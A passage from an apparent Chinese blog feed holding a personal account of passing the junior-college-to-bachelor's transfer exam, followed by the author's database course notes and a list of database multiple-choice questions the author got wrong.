title="IMG_6014"><p>一个人在操场上散步</p><img src="/escape_ydxy/IMG_6037.jpg" class="" title="IMG_6037"><h2 id="2021年1月-2月-回家过年-没有学习"><a href="#2021年1月-2月-回家过年-没有学习" class="headerlink" title="2021年1月-2月 回家过年 没有学习"></a>2021年1月-2月 回家过年 没有学习</h2><img src="/escape_ydxy/IMG_6596.jpg" class="" title="IMG_6596"><h2 id="断断续续的学习"><a href="#断断续续的学习" class="headerlink" title="断断续续的学习"></a>断断续续的学习</h2><p>回学校开始上线下的课程了，已经意识到了紧迫性，因为在此之前，自己的学习时间仅仅只限于上课的时候，线下完全没有自己去主动学习。</p><img src="/escape_ydxy/image-20220730211731538.png" class="" title="image-20220730211731538"><p>这是Notion，用的b站<a href="https://space.bilibili.com/601898396">Hannability</a>的<a href="https://www.bilibili.com/video/BV18b4y1v7mj">模板</a>。</p><p>可以看出来我在2月前是比较难受的一个阶段，我自己可以把这段时间定义为自己的试错阶段吧，自己在不断尝试新方法来提高自己的学习力，再后面的几周就变样了，关于里面的内容我可以截取一周的给你们参考。</p><img src="/escape_ydxy/image-20220730211958288.png" class="" title="image-20220730211958288"><p>这是一个简单的 Tracker。</p><img src="/escape_ydxy/image-20220807215933690.png" class="" title="image-20220807215933690"><img src="/escape_ydxy/image-20220730211940851.png" class="" title="image-20220730211940851"><p>每天花5分钟写一写东西，保持输出能力。</p><p>然后后面几周的可见比以前的好很多了。</p><img src="/escape_ydxy/image-20220730212443576.png" class="" title="image-20220730212443576"><h2 id="心理过程"><a href="#心理过程" class="headerlink" title="心理过程"></a>心理过程</h2><p>要说我不焦虑是不可能的，其实是后面的焦虑感越来越大，被我化成动力了。</p><p>晚上想高数的题目睡不着觉，凌晨5点爬起来刷模拟卷，其实到最后高数的模拟卷只做了5套，完整复盘了3套。</p><p>我最大的问题确实是在高数，我前期刚开始复习的时候连三角函数都分不清。后面还是慢慢来，题目一道一道做，看书上的知识点记忆+实践。平时上课的知识点全部弄懂了，然后错题也整理，老师上课讲的每一道题目都弄懂弄通，不会的题目就丢错题本里，一遍一遍刷，第一遍做对的题目就留着，做错的打个标记擦掉，第二天继续做，重复以上，直到做对为止。</p><img src="/escape_ydxy/IMG_3079.PNG" class="" title="IMG_3079"><p>程序设计基础，emmm，就只有数据库没学过，C是浅学吧，也不难。这俩我花的时间相对较少。</p><img src="/escape_ydxy/IMG_2350.JPG" class="" title="IMG_2350"><h1 id="考试前夕"><a href="#考试前夕" class="headerlink" title="考试前夕"></a>考试前夕</h1><p>5月3日，定了一个学校附近的宾馆的情侣房，其他宾馆要么就是比较差的，要么没房了，只剩下这个了。。这也是我人生中唯一一次住情趣房。233333，如果再晚点就没地方住了就惨了。其实应该还早点定的，岳阳的宾馆挺便宜，这种房2晚只要226。</p><img src="/escape_ydxy/image-20220807221829988.png" class="" title="image-20220807221829988"><p>然后查了查进学校考试是走东一门，刚开始还感觉怪怪的，怎么是南湖学院，是不是搞错了，事实证明就是这里。（直到今天我还是没搞懂这个学校的院区分部，南湖是在北方，本部却在南方，好奇怪设定）</p><img src="/escape_ydxy/image-20220807222115972.png" class="" title="image-20220807222115972"><p>5月10日，根据发的涉疫统计表，查看了竞争压力，也就是简单筛选一下那些因为疫情不能来的，给自己减轻一些压力。</p><img src="/escape_ydxy/image-20220807222515567.png" class="" title="image-20220807222515567"><p>5月13日 G832 长沙 -&gt; 岳阳。</p><img src="/escape_ydxy/IMG_7261.jpg" class="" title="IMG_7261"><img src="/escape_ydxy/IMG_7262.jpg" class="" title="IMG_7262"><img src="/escape_ydxy/IMG_7273.jpg" class="" title="IMG_7273"><img src="/escape_ydxy/IMG_7277.jpg" class="" title="IMG_7277"><p><em>学校大门口</em></p><img src="/escape_ydxy/IMG_7279.jpg" class="" title="IMG_7279"><p><em>所谓的情趣大床，23333</em></p><img src="/escape_ydxy/IMG_7280.jpg" class="" title="IMG_7280"><p>买了桶装水，咖啡是自备的，怕考试的时候睡着。</p><img src="/escape_ydxy/Screenshot_20220808-172956.jpg" class="" title="Screenshot_20220808-172956"><p>第二天一清早就看到父上大人发的消息，趁着泡咖啡的功夫洗了个澡。</p><p>早餐吃的玉米肠+牛奶，要让自己有点饥饿感，才不犯困。</p><img src="/escape_ydxy/IMG_20220514_120918.jpg" class="" title="IMG_20220514_120918"><p>上午考完，自我感觉不错，中午的饭是免费的。</p><img src="/escape_ydxy/IMG_7300.jpg" class="" title="IMG_7300"><p>下午考完就去找了饼饼，<del>约了个饭</del>（实际上是各付各的），第二天早上我就回我的大专了。</p><img src="/escape_ydxy/IMG_7301.jpg" class="" title="IMG_7301"><p><em>学校的图书馆</em></p><h1 id="考试阶段"><a href="#考试阶段" class="headerlink" title="考试阶段"></a>考试阶段</h1><h2 id="大学英语"><a href="#大学英语" class="headerlink" title="大学英语"></a>大学英语</h2><p>英语是四级难度差不多的水平，我也只考了73分。对于我仍然是<strong>完形填空和作文</strong>拉了，拿手的阅读理解试卷上只有两篇。</p><p>如何更能优化呢？这个不用多说吧。</p><h2 id="理工专业基础"><a href="#理工专业基础" class="headerlink" title="理工专业基础"></a>理工专业基础</h2><p>这一门考试其实是数学，只考了高数上，当时看到考纲的时候只说了考<strong>同济高数</strong>这本书，我打电话给学校的老师问，也表示不清楚，要等老师。复习的时候我高数上下双修，最后没考是没想到的。</p><img src="/escape_ydxy/image-20220807221358946.png" class="" title="image-20220807221358946"><p><em>刚开始跟同学讨论，预测高数上是重点。</em></p><p>题目难度并不难，其中很多题目我都做过了。考察的重点是<strong>积分部分</strong>，比如说三角换元、裂项相消之类的。这种小技巧的并不太难的地方我都针对性的复习了，所以考试在这方面没有太丢分。最后一题是定积分求面积，没做出来（但那道题求体积我会做），题目我贴在下面了，有兴趣可以做一下。</p><img src="/escape_ydxy/image-20220518211231785.png" class="" title="image-20220518211231785"><p>最后考试考了87分，其实我考试的时候求不定积分常数 C 忘记写了，不过老师是人性化改卷，该扣的扣了该给的也给了。</p><p>总体难度还是偏易，毕竟这是面向专科生的考试。</p><h2 id="程序设计基础"><a href="#程序设计基础" class="headerlink" title="程序设计基础"></a>程序设计基础</h2><p>最后一门是程序设计基础，这场考试刚拿到试卷我就窃喜了，因为：<strong>全！是！编！程！题！</strong></p><p>在学校发布的文件中，我很早就注意到了这句话</p><blockquote><p>以程序设计工程应用能力考核为主</p></blockquote><p>这代表了什么，代表了肯定是编程题占大头。没想到占这么大头，试卷一共5道题，每道题20分。前4道是C语言的，最后一道是数据库的。</p><p>题目都不难，数据库我认为比较难的 not exist 都没考，难度就到多表查询那么大。</p><p>C 语言的题目的难度呢，我认为在 OJ 里刷3天题目就够了，然后把谭书简单看一遍。</p><p>举一道题的例子吧，是这样的。</p><blockquote><p>输入一个正整数，求这个数的偶数和（包括它本身）</p><p>例：</p><p>输入：5</p><p>输出：6</p><p>输入：8</p><p>输出：20</p></blockquote><p>这是我认为在里面比较难的题目了，因为其他题目都是简单的输入输出循环控制。这道题稍微要动一点点脑子。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>考试难度中等偏易，给的建议就是要全面复习，不要往难题钻，这也是我们数学老师多次强调的.</p><p>在前期复习的时候我看的是 MOOC 上翁恺的课程，数据库看的是哈工大课程，现在网上资源特别丰富，根本不愁找不到课程，最重要的还是自己的决心与毅力。</p><h1 id="考试结束后"><a href="#考试结束后" class="headerlink" title="考试结束后"></a>考试结束后</h1><p>5月19日，我还在整理大专的旧书，准备拖出去卖。别人告诉我的学校官网公布成绩了。</p><img src="/escape_ydxy/image-20220808175346784.png" class="" title="image-20220808175346784"><p>当时自己还觉得自己上不了，然后查下来发现排名是本专业第二，和之前查参加考试人数一样的办法。</p><img src="/escape_ydxy/image-20220808213626204.png" class="" title="image-20220808213626204"><p>第一名是他，第二名就是我了。</p><img src="/escape_ydxy/image-20220808215643598.png" class="" title="image-20220808215643598"><p>晚上就和室友拿卖书的钱买奶茶喝了。</p><img src="/escape_ydxy/image-20220808215913744.png" class="" title="image-20220808215913744"><p>之后呢，就是忙毕设，整理行李回家。</p><img src="/escape_ydxy/image-20220808220011824.png" class="" title="image-20220808220011824"><p>6月28日，顺利拿到专科毕业证。</p><img src="/escape_ydxy/image-20220808220059287.png" class="" title="image-20220808220059287"><p>8月3日，拿到专升本录取通知书。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这篇主要是以记录为主，本人文笔有限只能像写日记这样叙述出来。</p><p>学历是一块敲门砖，但是不要忘了能力依然很重要。</p><p>我虽然作为专科生，但是在自己的空闲时间折腾很多奇奇怪怪的东西，和周围的同学相比格格不入（虽然我也玩游戏）。但是我记着我要对自己的人生负责，自己想要什么样的生活就去争取。我从高中到大学的最大变化是，有了长远目标了。</p><p>曾经的我是只要有游戏玩，能让我快乐就满意了，但是经过了很多次现实的历练（实习）逐渐认识到了残酷，赚钱真难，官场气氛难受。然后发现学习是另一条能让自己成长的路，既然还年轻，不如多学一点？</p><p>我个人的建议是，建议你们提前体验一下实习的生活，专科的实习是一个很棒的机会，如果没有实习，我心里就没有强烈的对比感，可能这个本科也就上不去了。</p><p><strong>痛苦+反思&#x3D;进步</strong></p><p>我一直在用这个来减轻痛苦，事实证明这也有用。</p><p>希望本文能帮助到你们，也希望你们能顺利升上自己想要的大学。</p><p>加油！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;个人背景&quot;&gt;&lt;a href=&quot;#个人背景&quot; class=&quot;headerlink&quot; title=&quot;个人背景&quot;&gt;&lt;/a&gt;个人背景&lt;/h1&gt;&lt;p&gt;我高三厌学，因为家里有表哥的先例，和家人商议后选择了单招。前期院校就随便凭自己的兴趣选的湖南邮电职业技术学院。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="学习" scheme="https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="考试" scheme="https://blog.irec.moe/tags/%E8%80%83%E8%AF%95/"/>
    
    <category term="升学" scheme="https://blog.irec.moe/tags/%E5%8D%87%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>数据库笔记</title>
    <link href="https://blog.irec.moe/dbnote.html"/>
    <id>https://blog.irec.moe/dbnote.html</id>
    <published>2022-04-15T16:00:00.000Z</published>
    <updated>2025-07-07T17:24:56.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库笔记"><a href="#数据库笔记" class="headerlink" title="数据库笔记"></a>数据库笔记</h1><h1 id="第1章-绪论"><a href="#第1章-绪论" class="headerlink" title="第1章 绪论"></a>第1章 绪论</h1><h2 id="1-1-数据库系统概论"><a href="#1-1-数据库系统概论" class="headerlink" title="1.1 数据库系统概论"></a>1.1 数据库系统概论</h2><h2 id="1-2-数据模型"><a href="#1-2-数据模型" class="headerlink" title="1.2 数据模型"></a>1.2 数据模型</h2><p>数据模型是对现实世界数据<strong>特征的抽象</strong></p><p>数据模型是<strong>数据库系统</strong>的<strong>核心和基础</strong></p><h3 id="两类数据模型"><a href="#两类数据模型" class="headerlink" title="两类数据模型"></a>两类数据模型</h3><p><strong>概念模型（信息模型）</strong>：按用户的观点来对数据和信息建模，用于数据库设计</p><p><strong>逻辑模型（网状模型、层次模型、关系模型、面向对象数据模型….）</strong>：按计算机系统的观点对数据建模、数据库管理系统的实现</p><p><strong>物理模型</strong>： 描述数据在系统内（<strong>磁盘</strong>上）的表示方法和存取方法</p><p>现实世界 –&gt; 概念模型：数据库设计人员完成</p><p>概念模型 –&gt; 逻辑模型：数据库设计人员完成、数据库设计工具协助完成</p><h3 id="概念模型"><a href="#概念模型" class="headerlink" title="概念模型"></a>概念模型</h3><p><strong>实体-联系（Entity-Relationship）：用E-R图来描述现实世界的概念模型</strong></p><p>实体：具体的人、事或抽象的概念（例如学生</p><p>属性：就是属性</p><p>码：唯一标识</p><p>实体型：实体名+属性名来抽象刻画同类实体</p><p>实体集：同一类型实体的集合</p><p>联系：就是联系</p><p>实体内部的联系：各属性之间的关系</p><p>实体之间的联系：不同实体集之间的联系（1 : 1、1 : M、M : N）</p><h3 id="数据模型：是严格定义的一组概念的集合"><a href="#数据模型：是严格定义的一组概念的集合" class="headerlink" title="数据模型：是严格定义的一组概念的集合"></a>数据模型：是严格定义的一组概念的集合</h3><p><strong>数据结构：</strong>组成对象和对象之间的联系</p><p><strong>数据操作：</strong>对数据库允许执行的操作的集合。就是对操作的规则</p><p><strong>数据的完整性约束：</strong>要让数据库符合这种规则不让数据库乱七八糟（主键必须存在，如果有引用的外键，要怎么怎么样做之类</p><p>关系数据模型是目前最重要的一种<strong>数据模型</strong>，它的三个要素分别是（ ）</p><ul><li><p>A. 实体完整性、参照完整性、用户自定义完整性</p></li><li><p>B. 数据结构、关系操作、完整性约束</p></li><li><p>C. 数据增加、数据修改、数据查询</p></li><li><p>D. 外模式、模式、内模式</p><p>这题和哪种数据模型没关系，数据模型通常都由那三种组成的。</p></li></ul><h3 id="常用的数据模型"><a href="#常用的数据模型" class="headerlink" title="常用的数据模型"></a>常用的数据模型</h3><img src="/dbnote/image-20220411220452040.png" class="" title="image-20220411220452040"><p><strong>格式化模型</strong>中的数据结构的单位：<strong>基本层次联系</strong></p><p><strong><img src="/dbnote/image-20220411220351572.png" class="" title="image-20220411220351572"></strong></p><h3 id="层次模型"><a href="#层次模型" class="headerlink" title="层次模型"></a>层次模型</h3><p>表示方法：实体型、属性、联系</p><p>定义：1、只有一个节点没有双亲节点，这个节点叫根节点</p><p>​2、根以外的其他节点只有一个双亲节点</p><p>特点：1、节点双亲唯一</p><p>​2、只能直接处理一对多</p><p>​3、不能脱离双亲独立存在</p><p>​4、任何记录只能一层一层找下去</p><img src="/dbnote/image-20220411221154166.png" class="" title="image-20220411221154166"><p>优点：1、数据结构清晰</p><p>​2、查询效率高，性能优于关系模型</p><p>​3、良好的完整性支持</p><p>缺点：1、多对多联系不太好</p><p>​2、插入和删除限制多</p><p>​3、查询子女节点必须经过双亲节点</p><h3 id="网状模型"><a href="#网状模型" class="headerlink" title="网状模型"></a>网状模型</h3><p>表示方法同层次模型</p><p>定义：1、允许一个以上的节点无双亲</p><p>​2、一个节点可以有多个双亲</p><p>​3、两个节点有多种联系</p><p>多对多在网状模型中的表示：多对多分解成一对多</p><p>完整性约束条件不严格：</p><p>1、允许插入未确定双亲结点值的子女节点值</p><p>2、允许只删除双亲节点值</p><p>实际的网状数据库系统：</p><p>1、支持码</p><p>2、保证一个联系中双亲记录和子女记录之间是一对多联系</p><p>3、可以定义双亲记录和子女记录之间某些约束条件</p><pre><code>  例：要求双亲记录存在才能插入子女记录，双亲记录删除时也同时删除。</code></pre><p>​  学生选课记录值中学号必须是学生记录中存在的某一学生学号，</p><p>​  课程号必须是课程记录中存在的某一门课程号。</p><p>优点：1、更加直接的描述现实世界，一个节点多个双亲</p><p>​2、性能高</p><p>缺点：1、结构复杂</p><p>​2、DDL、DML 语言太难</p><h3 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h3><p>关系（Relation）：一张表</p><p>元组（Tuple）：一行即为一个元组</p><p>属性（Attribute）：一列即为一个属性</p><p>主码（Key）：唯一确定一个元组</p><p>域（Domain）：一组具有相同数据类型的值的集合，属性的取值范围<strong>来自域</strong>**</p><p>分量：元组中的一个属性值</p><p>关系模式：对关系的描述</p><p>​学生（<u>学号</u>，姓名，年级，年龄）</p><p>关系必须是规范化的，关系的每一个分量必须是一个不可再分的数据项（这个好理解周老师讲过了，列中有列）</p><img src="/dbnote/image-20220411223256250.png" class="" title="image-20220411223256250"><p><strong>数据操作都是集合操作：操作对象和操作结果都是关系</strong></p><p>优点：1、建立在严格的数学概念的基础上</p><p>​2、概念单一：实体和各类联系都用关系来表示，对数据的检索结果也是关系</p><p>​3、关系模型的存储路径对用户透明</p><p>缺点：由于存储路径透明，查询效率不如格式化数据模型。为了提高效率必须对用户的查询请求进行优化（例如缩小查询范围，多表关联的时候先筛一部分）</p><h2 id="1-3-数据库系统的结构"><a href="#1-3-数据库系统的结构" class="headerlink" title="1.3 数据库系统的结构"></a>1.3 数据库系统的结构</h2><p>开发人员角度：三级模式结构。数据库系统内部的系统结构</p><p>用户角度：单用户结构、主从式结构、分布式结构、客户-服务器、浏览器-应用服务器 &#x2F; 数据库服务器</p><h3 id="模式的概念"><a href="#模式的概念" class="headerlink" title="模式的概念"></a>模式的概念</h3><p>模式：对数据库逻辑结构和特征的描述（学生表）</p><p>实例：模式的具体值（升本成功的所有学生的记录、没有升本成功的所有学生的记录）</p><p>模式是固定的、示例是变化的</p><h3 id="三级模式"><a href="#三级模式" class="headerlink" title="三级模式"></a>三级模式</h3><img src="/dbnote/image-20220411230045200.png" class="" title="image-20220411230045200"><p><strong>多个</strong> 外模式（子模式、用户模式）：数据库用户使用的<strong>局部</strong>数据的逻辑结构和特征的描述</p><p>​与模式的关系：通常是模式的子集、一个模式有多个外模式</p><p>​与应用的关系：一个外模式可以为多个应用系统所使用，一个应用程序只能使用一个外模式</p><p>​用途：简化用户视图。保证数据库安全性</p><p><strong>一个</strong> 模式（逻辑模式）：数据库中全体数据的逻辑结构和特征的描述</p><p>​定义：1、用 DDL 定义数据的逻辑结构</p><p>​2、定义数据之间的联系</p><p>​3、定义数据有关的安全性、完整性要求</p><p><strong>一个</strong> 内模式（存储模式）：物理结构和存储方式的描述</p><h3 id="二级映像"><a href="#二级映像" class="headerlink" title="二级映像"></a>二级映像</h3><p>外模式 -&gt; 模式</p><p><strong>定义外模式和模式之间的对应关系</strong></p><p>映像定义 通常包含在各外模式的描述中</p><p>每一个外模式都有一个 外模式 -&gt; 模式 映像</p><p>保证<strong>数据的逻辑独立性</strong>：当模式改变时，DBA 对 外模式 &#x2F; 模式 映像做相应改变，使外模式保持不变。应用程序是依据数据的外模式编写的，应用程序不用改，保证了数据与程序的逻辑独立性，简称RT</p><p>模式 -&gt; 内模式</p><p><strong>定义数据全局逻辑结构与存储结构之间的对应关系</strong></p><p>这个映像是唯一的，<strong>保证数据的物理独立性</strong></p><p>优势：保证了应用程序的稳定性</p><p>​以程序为中心 -&gt; 以数据为中心</p><p>​数据的存取由数据库管理系统管理</p><h2 id="1-4-数据库系统的组成"><a href="#1-4-数据库系统的组成" class="headerlink" title="1.4 数据库系统的组成"></a>1.4 数据库系统的组成</h2><p>1、硬件平台及数据库：大内存、大磁盘、大通道</p><p>2、软件：数据库管理系统、操作系统、与数据库接口的高级语言及其编译系统、应用开发工具、数据库应用系统</p><p>3、人员：用户、应用程序员、系统分析员和数据库设计人员、数据库管理员</p><img src="/dbnote/image-20220411231029299.png" class="" title="image-20220411231029299"><p>1、数据库管理员：略</p><p>2、系统分析员：负责应用系统的需求分析和规范说明</p><p>​与用户及数据库管理员结合，确定系统的硬软件配置</p><p>​参与数据库系统的<strong>概要设计</strong></p><p>​  数据库设计人员：<strong>参加用户需求调查和系统分析</strong>确定数据库中的数据</p><p>​ 设计数据库<strong>各级模式</strong></p><p>3、应用程序员：设计和编写应用系统的程序模块进行调试和安装</p><p>4、用户：通过应用系统的用户接口使用数据库</p><h2 id="1-5-小结"><a href="#1-5-小结" class="headerlink" title="1.5 小结"></a>1.5 小结</h2><p>重点：概念模型的基本概念、<strong>数据模型的3个组成要素</strong>、三模两映、数据库系统的逻辑独立性和物理独立性</p><h1 id="第10章-数据库恢复技术"><a href="#第10章-数据库恢复技术" class="headerlink" title="第10章 数据库恢复技术"></a>第10章 数据库恢复技术</h1><p>事务的四大特性：ACID</p><p>Atom 原子性</p><p>Consistent 一致性</p><p>Isolate 隔离性</p><p>Duration 持久性</p><h1 id="第11章-并发控制"><a href="#第11章-并发控制" class="headerlink" title="第11章 并发控制"></a>第11章 并发控制</h1><h2 id="并发带来的问题"><a href="#并发带来的问题" class="headerlink" title="并发带来的问题"></a>并发带来的问题</h2><p>丢失修改</p><p>读脏数据</p><p>不可重复读</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>排他锁：写锁 X锁</p><p>共享锁：读锁 S锁</p><h2 id="封锁协议"><a href="#封锁协议" class="headerlink" title="封锁协议"></a>封锁协议</h2><p>一级封锁协议：修改时，必须加X锁，直到结束。</p><p>二级封锁协议：读的时候，加S锁，用完就放。</p><p>三级封锁协议：读的时候，加S锁，直到结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据库笔记&quot;&gt;&lt;a href=&quot;#数据库笔记&quot; class=&quot;headerlink&quot; title=&quot;数据库笔记&quot;&gt;&lt;/a&gt;数据库笔记&lt;/h1&gt;&lt;h1 id=&quot;第1章-绪论&quot;&gt;&lt;a href=&quot;#第1章-绪论&quot; class=&quot;headerlink&quot; title=&quot;第</summary>
      
    
    
    
    <category term="学习" scheme="https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="笔记" scheme="https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="数据库" scheme="https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>数据库错题</title>
    <link href="https://blog.irec.moe/dbquestion.html"/>
    <id>https://blog.irec.moe/dbquestion.html</id>
    <published>2022-04-15T16:00:00.000Z</published>
    <updated>2025-07-07T17:25:02.094Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库错题"><a href="#数据库错题" class="headerlink" title="数据库错题"></a>数据库错题</h1><h3 id="下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（-）。"><a href="#下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（-）。" class="headerlink" title="下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（  ）。"></a>下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（  ）。</h3><p> I．人工管理阶段 II．文件系统阶段 III．数据库阶段</p><ul><li>A. I 和 II</li><li>B. 只有 II</li><li>C. II 和 III</li><li>D. 只有 I</li></ul><h3 id="关于数据库系统语言，下列说法正确的是-。"><a href="#关于数据库系统语言，下列说法正确的是-。" class="headerlink" title="关于数据库系统语言，下列说法正确的是______。"></a>关于数据库系统语言，下列说法正确的是______。</h3><ul><li>A.数据库系统语言包括了DDL和DML</li><li>B.数据库系统语言包括了DDL、DML和DCL</li><li>C.数据库系统语言包括了DDL、DML和C++&#x2F;Java</li><li>D.数据库系统语言包括了DDL、DML和程序设计语言</li></ul><h3 id="下列说法不正确的是-。"><a href="#下列说法不正确的是-。" class="headerlink" title="下列说法不正确的是_______________。"></a><strong>下列说法不正确的是_______________。</strong></h3><ul><li>A.模式是对数据的抽象，数据的结构性描述称为模式</li><li>B.数据模型是对模式的抽象，模式的结构性描述称为数据模型</li><li>C.一个数据库是由一系列模式及其数据构成的</li><li>D.模式是对数据模型的抽象，数据模型的结构性描述称为模式</li></ul><h3 id="第一代数据库系统是指-。"><a href="#第一代数据库系统是指-。" class="headerlink" title="第一代数据库系统是指_______________。"></a><strong>第一代数据库系统是指_______________。</strong></h3><ul><li>A.文件系统</li><li>B.基于XML模型的数据库系统</li><li>C.基于关系模型的数据库系统</li><li>D.基于网状模型或层次模型的数据库系统</li></ul><p>tip:是数据库系统，不是数据管理（记录）阶段</p><h3 id="第二代数据库系统是指-。"><a href="#第二代数据库系统是指-。" class="headerlink" title="第二代数据库系统是指_______________。"></a><strong>第二代数据库系统是指_______________。</strong></h3><ul><li>A.基于文件的数据库系统；</li><li>B.基于XML模型的数据库系统</li><li>C.基于网状模型或层次模型的数据库系统</li><li>D.基于关系模型的数据库系统</li></ul><h3 id="现有如下关系：患者（患者编号，患者姓名，性别，出生日期），医疗（患者编号，患者姓名，医生编号，医生姓名，诊断日期）。其中，“医疗”关系中的外键是"><a href="#现有如下关系：患者（患者编号，患者姓名，性别，出生日期），医疗（患者编号，患者姓名，医生编号，医生姓名，诊断日期）。其中，“医疗”关系中的外键是" class="headerlink" title="现有如下关系：患者（患者编号，患者姓名，性别，出生日期），医疗（患者编号，患者姓名，医生编号，医生姓名，诊断日期）。其中，“医疗”关系中的外键是_______"></a><strong>现有如下关系：患者（患者编号，患者姓名，性别，出生日期），医疗（患者编号，患者姓名，医生编号，医生姓名，诊断日期）。其中，“医疗”关系中的外键是_______</strong></h3><ul><li>A.患者编号</li><li>B.患者姓名</li><li>C.患者编号和患者姓名</li><li>D.医生编号</li></ul><h3 id="关于关系模型完整性的说法，不正确的是"><a href="#关于关系模型完整性的说法，不正确的是" class="headerlink" title="关于关系模型完整性的说法，不正确的是___"></a>关于关系模型完整性的说法，不正确的是___</h3><ul><li>A.外键如果取空值，则违反了参照完整性</li><li>B.数据库中有了空值会影响许多方面，如影响聚集函数运算的正确性等</li><li>C.用户自定义完整性是指用户针对具体的数据库应用所定义的完整性约束条件</li><li>D.实体完整性和参照完整性一般由DBMS系统自动支持</li></ul><p>tips：外键可以为空，非空则要有对应的值</p><h3 id="关于关系模式与关系，说法不正确的是"><a href="#关于关系模式与关系，说法不正确的是" class="headerlink" title="关于关系模式与关系，说法不正确的是_______"></a><strong>关于关系模式与关系，说法不正确的是_______</strong></h3><ul><li>A.关系模式是稳定的；同一关系模式下，只有一种关系</li><li>B.同一关系模式下，可有很多的关系</li><li>C.关系模式是关系的结构, 关系是关系模式在某一时刻的数据</li><li>D.关系模式是稳定的；而关系是某一时刻的值，是随时间可能变化的</li></ul><h3 id="根据上述关系，求表R⋈W的结果"><a href="#根据上述关系，求表R⋈W的结果" class="headerlink" title="根据上述关系，求表R⋈W的结果_______"></a><strong>根据上述关系，求表R⋈W的结果_______</strong></h3><img src="/dbquestion/80A7EDB561D87941BE087E2B9DD27D33.png" class="" title="img"><ul><li>A.<img src="/dbquestion/7AB149E8077AF90A3019D339B5B4D004.png" class="" title="img"></li><li>B.<img src="/dbquestion/3FCDD90FE93D49A011AAF93D38D87EBA.png" class="" title="img"></li><li>C.<img src="/dbquestion/B4F48B7E1DC0133A82658E8510724641.png" class="" title="img"></li><li>D.没有正确答案</li></ul><h3 id="系如下图所示，查询既学习课程号为001课程又学习课程号为002号课程的学生的学号-正确的是"><a href="#系如下图所示，查询既学习课程号为001课程又学习课程号为002号课程的学生的学号-正确的是" class="headerlink" title="系如下图所示，查询既学习课程号为001课程又学习课程号为002号课程的学生的学号,正确的是_______"></a><strong>系如下图所示，查询既学习课程号为001课程又学习课程号为002号课程的学生的学号,正确的是_______</strong></h3><img src="/dbquestion/FCF4CF4C2F3E0FCCB9B1429D78C7FD76.png" class="" title="img"><ul><li>A.<img src="/dbquestion/D962F9C666D30E7E08C49F6F1EB63597.png" class="" title="img"></li><li>B.<img src="/dbquestion/C3D25E361360D8D4A1285CD2886EF1AC.png" class="" title="img"></li><li>C.<img src="/dbquestion/42CBCA0093E89F26628461E115C7AD49.png" class="" title="img"></li><li>D.<img src="/dbquestion/EB17775C63C512CF6C66DBB5A3FC84D9.png" class="" title="img"></li></ul><p>tip：D选项查询结果为空，原因自己想。</p><h3 id="关系R与关系S只有一个公共属性，T1是R与S做θ连接的结果，T2是R与S自然连接的结果，则下列说法正确的是"><a href="#关系R与关系S只有一个公共属性，T1是R与S做θ连接的结果，T2是R与S自然连接的结果，则下列说法正确的是" class="headerlink" title="关系R与关系S只有一个公共属性，T1是R与S做θ连接的结果，T2是R与S自然连接的结果，则下列说法正确的是_______"></a><strong>关系R与关系S只有一个公共属性，T1是R与S做θ连接的结果，T2是R与S自然连接的结果，则下列说法正确的是_______</strong></h3><ul><li>A.T1的属性个数大于T2的属性个数</li><li>B.T1 的属性个数等于T2</li><li>C.T1的属性个数小于T2</li><li>D.T1的属性个数大于或等于T2的属性个数</li></ul><p>tip：做θ连接时不需要将公共属性合并，而自然连接时需要，所以 T1 的属性个数大于 T2 的属性个数</p><h3 id="已知关系S-S-Sname-Sage-Sclass-SC-S-C-Score-。如下所示关系代数表达式的含义是-。"><a href="#已知关系S-S-Sname-Sage-Sclass-SC-S-C-Score-。如下所示关系代数表达式的含义是-。" class="headerlink" title="已知关系S(S#,Sname,Sage,Sclass), SC(S#,C#,Score)。如下所示关系代数表达式的含义是________。"></a>已知关系S(S#,Sname,Sage,Sclass), SC(S#,C#,Score)。如下所示关系代数表达式的含义是________。</h3><img src="/dbquestion/59F24C56F07146B09A29D0EDA648B7B1.png" class="" title="img"><ul><li>A.其他全不对</li><li>B.查询没有学习过课程号为002号课程的学生姓名和年龄</li><li>C.查询不仅仅学习课程号为002号课程的学生姓名和年龄</li><li>D.查询学习课程号为002号课程的学生姓名和年龄</li></ul><p>tips：此公式中 S X SC 运算之后 , 所有人都存在 C#&#x3D; 002 所以答案为空。</p><h3 id="表达“从一个关系的所有行中提取出满足某些条件的行”，“从一个关系的所有列中提取出某些列”“提取出属于一个关系但不属于另一关系的所有元组”“将两个关系必须按照某种条件串接成一个较大的关系”的操作依次是-。"><a href="#表达“从一个关系的所有行中提取出满足某些条件的行”，“从一个关系的所有列中提取出某些列”“提取出属于一个关系但不属于另一关系的所有元组”“将两个关系必须按照某种条件串接成一个较大的关系”的操作依次是-。" class="headerlink" title="表达“从一个关系的所有行中提取出满足某些条件的行”，“从一个关系的所有列中提取出某些列”“提取出属于一个关系但不属于另一关系的所有元组”“将两个关系必须按照某种条件串接成一个较大的关系”的操作依次是__________。"></a><strong>表达“从一个关系的所有行中提取出满足某些条件的行”，“从一个关系的所有列中提取出某些列”“提取出属于一个关系但不属于另一关系的所有元组”“将两个关系必须按照某种条件串接成一个较大的关系”的操作依次是__________。</strong></h3><p><em><strong>*1、并 2、交 3、积 4、选择 5、投影 6、差 